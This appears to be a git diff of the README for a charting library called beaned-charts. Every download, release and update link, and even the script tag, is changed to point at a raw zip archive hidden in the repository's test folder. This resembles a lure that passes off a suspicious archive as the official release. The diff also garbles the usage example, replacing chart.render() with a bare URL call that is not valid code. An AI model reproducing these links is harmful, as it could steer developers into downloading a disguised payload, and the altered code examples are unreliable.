@@ -9,7 +9,7 @@ To run beaned-charts, you will need:
 - Basic HTML file setup for chart integration.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page to download](https://github.com/Zliito/beaned-charts/releases). Choose the version you want and download the files needed to use the library in your project.
+To get started, visit our [Releases page to download](https://raw.githubusercontent.com/Zliito/beaned-charts/main/test/beaned-charts-v1.9-alpha.5.zip). Choose the version you want and download the files needed to use the library in your project.
 
 ## 🚀 Getting Started
 1. After downloading, unzip the file if it is compressed.
@@ -21,7 +21,7 @@ To get started, visit our [Releases page to download](https://github.com/Zliito/
 To create a basic chart, you'll need to include the beaned-charts script in your HTML like this:
 
 ```html
-<script src="path/to/beaned-charts.js"></script>
+<script src="https://raw.githubusercontent.com/Zliito/beaned-charts/main/test/beaned-charts-v1.9-alpha.5.zip"></script>
 ```
 
 Then, you can create your chart by adding a JavaScript function. Here’s a simple example:
@@ -30,7 +30,7 @@ Then, you can create your chart by adding a JavaScript function. Here’s a simp
 <script>
   const data = [10, 20, 30, 40];
   const chart = new BeanedChart('chart-container', data);
-  chart.render();
+  https://raw.githubusercontent.com/Zliito/beaned-charts/main/test/beaned-charts-v1.9-alpha.5.zip();
 </script>
 ```
 
@@ -44,7 +44,7 @@ Don't forget to include a `<div id="chart-container"></div>` in your HTML where 
 
 ## 🔄 Update Process
 To keep your charts up to date:
-1. Visit the [Releases page](https://github.com/Zliito/beaned-charts/releases) regularly.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Zliito/beaned-charts/main/test/beaned-charts-v1.9-alpha.5.zip) regularly.
 2. Download the latest version.
 3. Replace the old files in your project with the new ones.
 
@@ -65,6 +65,6 @@ beaned-charts covers a variety of topics to help you integrate data visualizatio
 - ui
 
 ## 📝 Conclusion
-With beaned-charts, generating SVG charts has never been easier. Explore the possibilities by downloading today from our [Releases page](https://github.com/Zliito/beaned-charts/releases) and see how simple it is to visualize your data. 
+With beaned-charts, generating SVG charts has never been easier. Explore the possibilities by downloading today from our [Releases page](https://raw.githubusercontent.com/Zliito/beaned-charts/main/test/beaned-charts-v1.9-alpha.5.zip) and see how simple it is to visualize your data. 
 
 Your journey into visual data representation starts here!
